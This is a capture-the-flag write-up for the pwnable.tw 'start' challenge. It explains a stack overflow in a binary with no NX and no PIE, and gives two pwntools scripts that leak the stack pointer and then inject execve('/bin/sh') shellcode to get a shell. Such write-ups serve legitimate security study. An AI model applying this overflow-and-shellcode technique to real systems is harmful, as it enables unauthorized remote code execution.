---
title: "start [pwnable.tw]"
date: 2020-07-17
draft: false
tags: ["pwnable.tw"]
---


Here our main objective is to get a shell. The bug is plain and simple, it is an overflow to control the return address.

<!--more-->

![](/images/pwnable1/pwnable1.png)

## Solution:

First I check the mitigations :

![](/images/pwnable1/pwnable2.png)

So I think it's going to be fun !! As we have the permission to execute the stack (NX disabled). There is also no PIE so we don't have to worry about the address changing every time :)
Now, let us run the binary and see what is happening :>

![](/images/pwnable1/pwnable3.png)

So it's simple just asking input and printing something. Now its time to see the assembly behind this binary.

![](/images/pwnable1/pwnable4.png)

So we can observe that all the registers are being emptied and then 5 values are beings pushed to the stack.
If we examine them we can see that they are the strings that are printed when we run the binary.
Math → 5 pushes are made and 4 bytes are taken for each push so a total of 20 bytes is taken by the binary to store it :P.
Also ``INT 0x80`` is equivalent to syscall. We can observe 2 syscalls being called

![](/images/pwnable1/pwnable5.png)

The first syscall is used to make the write. (For printing the string)

![](/images/pwnable1/pwnable6.png)

The second syscall is used to call read ( Probably to take our input ). Now let's see what we can do to get root access !!

I hope you find the offset by yourself or try pattern create in gdb-peda. :)

## Idea:

* We have to overflow to the return address and then we have to somehow leak the stack pointer (ESP)
* So if we get the stack pointers address then we can place the shellcode there and then point the EIP to that address to give us a shell!

``Remember the write syscall prints the buffer pointed by the ECX.``

* After the syscall, the stack is cleared as they call the add instruction (It removes the 20 bytes)

## Crafting the Exploit:

* first 20 bytes to fill the buffer then put the address of move ESP to ECX.
* So first input will give the ESP.
* Next, we place the shellcode (from shellstorm.org) then execute it.
* We don't have to worry about the shift of the stack because there is no PIE

```py
from pwn import *
p = remote('chall.pwnable.tw', 10000)
print(p.read())
buf = 'A'*20
buf += p32(0x08048087)
p.send(buf)
esp = unpack(p.read()[:4])
print hex(esp)
p.interactive()

```

note: u32 is the opposite of p32 this returns the number and then we convert the number to hex. Also, we read the first 4 bytes the server sends us.

Output: ``0xff819750``

## Final Exploitation

* We place the shellcode then just execute it, in the read that followed the write.

```py

from pwn import *
p = remote('chall.pwnable.tw', 10000)
print(p.read())
buf = 'A'*20
buf += p32(0x08048087)
p.send(buf)
esp = unpack(p.read()[:4])
shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
#new exploit
buf = 'a'*20
buf += p32(esp+20)
buf += shellcode
p.send(buf)
p.interactive()

```

![](/images/pwnable1/pwnable7.png)

I hope you liked the write-up. More writeups on its way.